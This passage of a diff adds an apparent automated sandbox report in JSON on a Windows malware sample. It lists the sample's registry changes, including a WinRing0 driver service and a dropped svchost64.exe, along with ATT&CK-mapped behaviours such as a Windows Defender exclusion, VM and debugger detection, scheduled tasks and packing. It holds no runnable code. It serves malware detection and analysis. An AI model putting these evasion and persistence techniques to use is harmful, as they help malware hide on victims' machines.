A6 FA 30 24 06 0A 2B 06 01 04 01 82 37 0A 0B 14 31 16 04 14 0E AC 82 60 40 56 27 97 E5 25 13 FC 2A E1 0A 53 95 59 E4 A4 30 30 06 0A 2B 06 01 04 01 82 37 0A 0B 62 31 22 04 20 88 5D E6 4C 34 0E 3E A7 06 5"
+    },
+    {
+      "key": "HKLM\\System\\CurrentControlSet\\Services\\WinRing0_1_2_0\\Start",
+      "value": "DWORD (0x00000003)"
+    },
+    {
+      "key": "HKLM\\System\\CurrentControlSet\\Services\\WinRing0_1_2_0\\ImagePath",
+      "value": "\\??\\%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Libs\\WR64.sys"
+    },
+    {
+      "key": "HKLM\\System\\CurrentControlSet\\Services\\WinRing0_1_2_0\\Start",
+      "value": "DWORD (0x00000004)"
+    },
+    {
+      "key": "HKLM\\SOFTWARE\\Microsoft\\Windows Media Player NSS\\3.0\\Servers\\A70D59A1-8EAD-4F40-AAAB-FBFC460800A4\\FriendlyName",
+      "value": "WORK: admin:"
+    },
+    {
+      "key": "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\MpKslf4810a54\\Parameters"
+    },
+    {
+      "key": "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\MpKslf4810a54\\Parameters\\Wdf"
+    },
+    {
+      "key": "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\MpKslf4810a54\\Parameters\\Wdf\\WdfMajorVersion",
+      "value": "1"
+    },
+    {
+      "key": "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\MpKslf4810a54\\Parameters\\Wdf\\WdfMinorVersion",
+      "value": "11"
+    }
+  ],
+  "tags": [
+    "DIRECT_CPU_CLOCK_ACCESS",
+    "CHECKS_NETWORK_ADAPTERS",
+    "DETECT_DEBUG_ENVIRONMENT",
+    "CALLS_WMI",
+    "RUNTIME_MODULES",
+    "CALLS_WMI",
+    "OBFUSCATED",
+    "DETECT_DEBUG_ENVIRONMENT",
+    "LONG_SLEEPS"
+  ],
+  "attack_techniques": {
+    "T1055": [
+      {
+        "description": "Creates a process in suspended mode (likely to inject code)",
+        "severity": "INFO"
+      },
+      {
+        "description": "Spawns processes",
+        "severity": "INFO"
+      }
+    ],
+    "T1083": [
+      {
+        "description": "Reads ini files",
+        "severity": "INFO"
+      }
+    ],
+    "T1057": [
+      {
+        "description": "Queries a list of all running processes",
+        "severity": "INFO"
+      }
+    ],
+    "T1053": [
+      {
+        "description": "Uses schtasks.exe or at.exe to add and modify task schedules",
+        "severity": "LOW"
+      }
+    ],
+    "T1036": [
+      {
+        "description": "Drops PE files to the windows directory (C:\\\\Windows)",
+        "severity": "INFO"
+      },
+      {
+        "description": "Creates files inside the user directory",
+        "severity": "INFO"
+      },
+      {
+        "description": "Creates files inside the system directory",
+        "severity": "INFO"
+      },
+      {
+        "description": "Drops a PE files to the windows directory (C:\\\\Windows) and starts it",
+        "severity": "LOW"
+      }
+    ],
+    "T1010": [
+      {
+        "description": "Sample monitors Window changes (e.g. starting applications), analyze the sample with the simulation cookbook",
+        "severity": "INFO"
+      }
+    ],
+    "T1518.001": [
+      {
+        "description": "Contains capabilities to detect virtual machines",
+        "severity": "INFO"
+      }
+    ],
+    "T1059": [
+      {
+        "description": "Very long cmdline option found, this is very uncommon (may be encrypted or packed)",
+        "severity": "INFO"
+      }
+    ],
+    "T1562.001": [
+      {
+        "description": "Creates guard pages, often used to prevent reverse engineering and debugging",
+        "severity": "INFO"
+      },
+      {
+        "description": "Adds a directory exclusion to Windows Defender",
+        "severity": "LOW"
+      }
+    ],
+    "T1543.003": [
+      {
+        "description": "Creates or modifies windows services",
+        "severity": "INFO"
+      }
+    ],
+    "T1497": [
+      {
+        "description": "May sleep (evasive loops) to hinder dynamic analysis",
+        "severity": "INFO"
+      },
+      {
+        "description": "Contains capabilities to detect virtual machines",
+        "severity": "INFO"
+      },
+      {
+        "description": "Contains long sleeps (>= 3 min)",
+        "severity": "INFO"
+      }
+    ],
+    "T1027.002": [
+      {
+        "description": "Binary may include packed or crypted data",
+        "severity": "INFO"
+      },
+      {
+        "description": "PE file has an executable .text section which is very likely to contain packed code (zlib compression ratio < 0.3)",
+        "severity": "INFO"
+      }
+    ],
+    "T1027": [
+      {
+        "description": ".NET source code contains long base64-encoded strings",
+        "severity": "INFO"
+      },
+      {
+        "description": "Binary may include packed or crypted data",
+        "severity": "INFO"
+      }
+    ],
+    "T1082": [
+      {
+        "description": "Queries the cryptographic machine GUID",
+        "severity": "INFO"
+      },
+      {
+        "description": "Reads software policies",
+        "severity": "INFO"
+      },
+      {
+        "description": "Queries a list of all running drivers",
+        "severity": "INFO"
+      },
+      {
+        "description": "Queries the volume information (name, serial number etc) of a device",
+        "severity": "INFO"
+      }
+    ],
+    "T1547.008": [
+      {
+        "description": "Spawns drivers",
+        "severity": "INFO"
+      }
+    ]
+  },
+  "text_highlighted": [
+    "C:\\Windows\\system32\\cmd.exe"
+  ],
+  "modules_loaded": [
+    "%SAMPLEPATH%\\03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b.exe",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\999d72a4e033bba86d05407570c67cba\\System.Management.Automation.ni.dll",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe",
+    "C:\\Windows\\System32\\wbem\\wmiutils.dll",
+    "ADVAPI32.dll",
+    "api-ms-win-core-synch-l1-2-0",
+    "api-ms-win-core-fibers-l1-1-1",
+    "kernel32",
+    "api-ms-win-core-localization-l1-2-1",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscoreei.dll",
+    "SHLWAPI.dll",
+    "api-ms-win-appmodel-runtime-l1-1-2.dll",
+    "api-ms-win-appmodel-runtime-l1-1-0.dll",
+    "VERSION.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll",
+    "USER32.dll",
+    "api-ms-win-core-quirks-l1-1-0.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscoree.dll",
+    "mscoree.dll",
+    "ntdll",
+    "C:\\Windows\\system32\\combase.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\fe2524177eb3088c77be666722039f52\\mscorlib.ni.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ole32.dll",
+    "ole32.dll",
+    "CRYPTBASE.dll",
+    "api-ms-win-core-xstate-l2-1-0.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clrjit.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\e43dd9c73ab5615e461bf5109c3facd6\\System.ni.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\nlssorting.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_64\\mscorlib\\v4.0_4.0.0.0__b77a5c561934e089\\bcrypt.dll",
+    "bcrypt.dll",
+    "shell32.dll",
+    "API-MS-Win-Security-SDDL-L1-1-0.dll",
+    "profapi.dll",
+    "kernel32.dll",
+    "CRYPTSP.dll",
+    "C:\\Windows\\system32\\rsaenh.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_64\\mscorlib\\v4.0_4.0.0.0__b77a5c561934e089\\oleaut32.dll",
+    "oleaut32.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Core\\0d59b0e237d7519417de10cd84bda4e7\\System.Core.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pb378ec07#\\b0fcf106681758b7af5211cc1367fc8e\\Microsoft.PowerShell.ConsoleHost.ni.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\OLEAUT32.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\08a991e54142198a258c6c3824708d25\\System.Management.Automation.ni.dll",
+    "ntdll.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\en-US\\mscorrc.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\en\\mscorrc.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorrc.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\psapi.dll",
+    "psapi.dll",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\amsi.dll",
+    "amsi.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\ntdll.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_64\\mscorlib\\v4.0_4.0.0.0__b77a5c561934e089\\shell32.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\wintrust.dll",
+    "wintrust.dll",
+    "MSISIP.DLL",
+    "C:\\Windows\\system32\\CRYPT32.dll",
+    "imm32.dll",
+    "C:\\Windows\\system32\\wshext.dll",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pwrshsip.dll",
+    "C:\\Windows\\system32\\tzres.dll",
+    "C:\\Windows\\system32\\en-US\\tzres.dll.mui",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Data\\7bed49c46de9295a8453db205c60a028\\System.Data.ni.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_64\\System.Data\\v4.0_4.0.0.0__b77a5c561934e089\\System.Data.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Xml\\5ee35debfc22f727e70e4479ddcbc045\\System.Xml.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Management\\b221af81285c1305324612e6dc9c88ff\\System.Management.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Dired13b18a9#\\8ad4c0af5b3d51a0f3a4dac0d44d85d4\\System.DirectoryServices.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.P6f792626#\\a51f82e48c6af5e2b5757b12ffccc080\\Microsoft.PowerShell.Security.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Transactions\\604272b0faec2e09d53d38e03bc89c6c\\System.Transactions.ni.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_64\\System.Transactions\\v4.0_4.0.0.0__b77a5c561934e089\\System.Transactions.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_64\\mscorlib\\v4.0_4.0.0.0__b77a5c561934e089\\secur32.dll",
+    "secur32.dll",
+    "SspiCli.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Configuration\\4beb1eeca20b27d4bd1bb9880f03cc2a\\System.Configuration.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Mf49f6405#\\cbac94f54441f8c7adbe6d607f8fe13b\\Microsoft.Management.Infrastructure.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Numerics\\86cfd69ce1261baf4740e7606cade014\\System.Numerics.ni.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\shlwapi.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.CSharp\\d011b632ffdc7e7df171eee4a06fcd05\\Microsoft.CSharp.ni.dll",
+    "API-MS-Win-Security-LSALookup-L1-1-0.dll",
+    "RpcRtRemote.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.M870d558a#\\7fa69cfcdc7bf493079cf9bef94bcfc6\\Microsoft.Management.Infrastructure.Native.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pae3498d9#\\5a33d70bf597090b1f9f55984c2a8778\\Microsoft.PowerShell.Commands.Management.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Confe64a9051#\\120a0532577f871c2415502d9edacdd6\\System.Configuration.Install.ni.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\urlmon.dll",
+    "api-ms-win-downlevel-advapi32-l1-1-0.dll",
+    "urlmon.dll",
+    "API-MS-WIN-DOWNLEVEL-SHLWAPI-L1-1-0.DLL",
+    "api-ms-win-downlevel-advapi32-l2-1-0.dll",
+    "ncrypt.dll",
+    "C:\\Windows\\system32\\bcryptprimitives.dll",
+    "USERENV.dll",
+    "GPAPI.dll",
+    "API-MS-WIN-Service-Management-L1-1-0.dll",
+    "API-MS-WIN-Service-Management-L2-1-0.dll",
+    "C:\\Windows\\system32\\cryptnet.dll",
+    "cryptnet.dll",
+    "SensApi.dll",
+    "RPCRT4.dll",
+    "WINHTTP.dll",
+    "WS2_32.dll",
+    "credssp.dll",
+    "C:\\Windows\\system32\\mswsock.dll",
+    "C:\\Windows\\System32\\wshtcpip.dll",
+    "C:\\Windows\\System32\\wship6.dll",
+    "IPHLPAPI.DLL",
+    "dhcpcsvc6.DLL",
+    "dhcpcsvc.DLL",
+    "NSI.dll",
+    "CFGMGR32.dll",
+    "API-MS-WIN-Service-winsvc-L1-1-0.dll",
+    "DNSAPI.dll",
+    "rasadhlp.dll",
+    "C:\\Windows\\System32\\fwpuclnt.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\crypt32.dll",
+    "crypt32.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CRYPT32.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\diasymreader.dll",
+    "GDI32.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\shell32.dll",
+    "propsys.dll",
+    "comctl32.dll",
+    "apphelp.dll",
+    "CLBCatQ.DLL",
+    "C:\\Windows\\System32\\ieframe.dll",
+    "API-MS-Win-Core-LocalRegistry-L1-1-0.dll",
+    "SETUPAPI.dll",
+    "C:\\Windows\\system32\\propsys.dll",
+    "ntmarta.dll",
+    "C:\\Windows\\system32\\urlmon.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.IO.Cb3b124c8#\\1e72628c6f64bbea2f27e20f9f2cf3b4\\System.IO.Compression.ni.dll",
+    "C:\\Windows\\system32\\schtasks.exe",
+    "C:\\Windows\\system32\\taskschd.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\\\wminet_utils.dll",
+    "C:\\Windows\\system32\\wbem\\wmiutils.dll",
+    "C:\\Windows\\system32\\wbem\\wbemprox.dll",
+    "C:\\Windows\\system32\\wbem\\wbemsvc.dll",
+    "C:\\Windows\\system32\\wbem\\fastprox.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\rasapi32.dll",
+    "rasapi32.dll",
+    "rtutils.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\ws2_32.dll",
+    "RASMAN.DLL",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\winhttp.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\iphlpapi.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\secur32.dll",
+    "C:\\Windows\\system32\\schannel.DLL"
+  ],
+  "registry_keys_opened": [
+    "HKLM\\Software\\Microsoft\\.NETFramework\\Policy",
+    "HKLM\\Software\\Microsoft\\.NETFramework\\Policy\\v4.0",
+    "HKLM\\Software\\Microsoft\\.NETFramework",
+    "HKLM\\Software\\Microsoft\\.NETFramework\\InstallRoot",
+    "HKLM\\Software\\Microsoft\\.NETFramework\\CLRLoadLogDir",
+    "HKLM\\Software\\Microsoft\\.NETFramework\\UseLegacyV2RuntimeActivationPolicyDefaultValue",
+    "HKLM\\Software\\Microsoft\\.NETFramework\\OnlyUseLatestCLR",
+    "HKCU\\Software\\Microsoft\\.NETFramework\\Policy\\Standards",
+    "HKLM\\Software\\Microsoft\\.NETFramework\\Policy\\Standards\\v4.0.30319",
+    "HKLM\\SOFTWARE\\Microsoft\\Fusion",
+    "HKLM\\SOFTWARE\\Microsoft\\Fusion\\NoClientChecks",
+    "HKLM\\Software\\Microsoft\\.NETFramework\\v4.0.30319\\SKUs",
+    "HKLM\\Software\\Microsoft\\.NETFramework\\v4.0.30319\\SKUs\\default",
+    "HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full",
+    "HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\\Release",
+    "HKLM\\Software\\Microsoft\\.NETFramework\\DisableConfigCache",
+    "HKLM\\Software\\Microsoft\\Fusion",
+    "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\itami.exe",
+    "HKLM\\Software\\Microsoft\\Fusion\\CacheLocation",
+    "HKLM\\Software\\Microsoft\\Fusion\\DownloadCacheQuotaInKB",
+    "HKLM\\Software\\Microsoft\\Fusion\\EnableLog",
+    "HKLM\\Software\\Microsoft\\Fusion\\LoggingLevel",
+    "HKLM\\Software\\Microsoft\\Fusion\\ForceLog",
+    "HKLM\\Software\\Microsoft\\Fusion\\LogFailures",
+    "HKLM\\Software\\Microsoft\\Fusion\\LogResourceBinds",
+    "HKLM\\Software\\Microsoft\\Fusion\\FileInUseRetryAttempts",
+    "HKLM\\Software\\Microsoft\\Fusion\\FileInUseMillisecondsBetweenRetries",
+    "HKLM\\Software\\Microsoft\\Fusion\\UseLegacyIdentityFormat",
+    "HKLM\\Software\\Microsoft\\Fusion\\DisableMSIPeek",
+    "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options",
+    "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DevOverrideEnable",
+    "HKLM\\Software\\Microsoft\\.NETFramework\\NGen\\Policy\\v4.0",
+    "HKLM\\Software\\Microsoft\\.NETFramework\\NGen\\Policy\\v4.0\\OptimizeUsedBinaries",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\Policy\\Servicing",
+    "HKLM\\Software\\Microsoft\\StrongName",
+    "HKLM\\Software\\Microsoft\\.NETFramework\\UseRyuJIT",
+    "HKLM\\Software\\Microsoft\\.NETFramework\\FeatureSIMD",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\Latest",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\index24",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\LegacyPolicyTimeStamp",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.Configuration__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.Configuration__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.Xml__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.Xml__b77a5c561934e089",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\Policy\\APTCA",
+    "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\S-1-5-21-3711686801-687107597-1149503783-1001",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\AppContext",
+    "HKLM\\SOFTWARE\\Microsoft\\PowerShell",
+    "HKLM\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine",
+    "HKLM\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine\\PowerShellVersion",
+    "HKLM\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine\\RuntimeVersion",
+    "HKLM\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine\\ConsoleHostAssemblyName",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Control\\MiniNT",
+    "HKLM\\SOFTWARE\\Microsoft\\PowerShell\\3",
+    "HKLM\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine\\NetFrameworkV4IsInstalled",
+    "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\powershell.exe",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.3.0.Microsoft.PowerShell.ConsoleHost__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.3.0.Microsoft.PowerShell.ConsoleHost__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.3.0.System.Management.Automation__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.3.0.System.Management.Automation__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.Configuration.Install__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.Configuration.Install__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.Core__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.Core__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.Numerics__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.Numerics__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.Security__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.Security__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.1.0.Microsoft.Management.Infrastructure__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.1.0.Microsoft.Management.Infrastructure__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.Transactions__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.Transactions__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.DirectoryServices__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.DirectoryServices__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.1.0.Microsoft.Management.Infrastructure.Native__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.1.0.Microsoft.Management.Infrastructure.Native__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.Runtime.Serialization__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.Runtime.Serialization__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.Management__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.Management__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.Data__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.Data__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.Microsoft.CSharp__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.Microsoft.CSharp__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.SMDiagnostics__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.SMDiagnostics__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\.NETFramework\\HillClimbing_TargetSignalToNoiseRatio",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.3.0.System.Management.Automation.resources_en-US_31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.3.0.System.Management.Automation.resources_en-US_31bf3856ad364e35",
+    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\Managed\\S-1-5-21-3711686801-687107597-1149503783-1001\\Installer\\Assemblies\\C:|Windows|System32|WindowsPowerShell|v1.0|powershell.exe",
+    "HKCU\\Software\\Microsoft\\Installer\\Assemblies\\C:|Windows|System32|WindowsPowerShell|v1.0|powershell.exe",
+    "HKLM\\SOFTWARE\\Classes\\Installer\\Assemblies\\C:|Windows|System32|WindowsPowerShell|v1.0|powershell.exe",
+    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\Managed\\S-1-5-21-3711686801-687107597-1149503783-1001\\Installer\\Assemblies\\Global",
+    "HKCU\\Software\\Microsoft\\Installer\\Assemblies\\Global",
+    "HKLM\\SOFTWARE\\Classes\\Installer\\Assemblies\\Global",
+    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WSMAN",
+    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\ServiceStackVersion",
+    "HKLM\\Software\\Microsoft\\PowerShell\\3\\PowerShellEngine",
+    "HKLM\\Software\\Microsoft\\PowerShell\\3\\PowerShellEngine\\ApplicationBase",
+    "HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.3.0.Microsoft.PowerShell.ConsoleHost.resources_en-US_31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.3.0.Microsoft.PowerShell.ConsoleHost.resources_en-US_31bf3856ad364e35",
+    "HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription",
+    "HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ConsoleSessionConfiguration",
+    "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\Pacific Standard Time",
+    "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\Pacific Standard Time\\TZI",
+    "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\Pacific Standard Time\\Dynamic DST",
+    "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\Pacific Standard Time\\Dynamic DST\\FirstEntry",
+    "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\Pacific Standard Time\\Dynamic DST\\LastEntry",
+    "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\Pacific Standard Time\\Dynamic DST\\2006",
+    "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\Pacific Standard Time\\Dynamic DST\\2007",
+    "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\Pacific Standard Time\\MUI_Display",
+    "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\Pacific Standard Time\\MUI_Std",
+    "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\Pacific Standard Time\\MUI_Dlt",
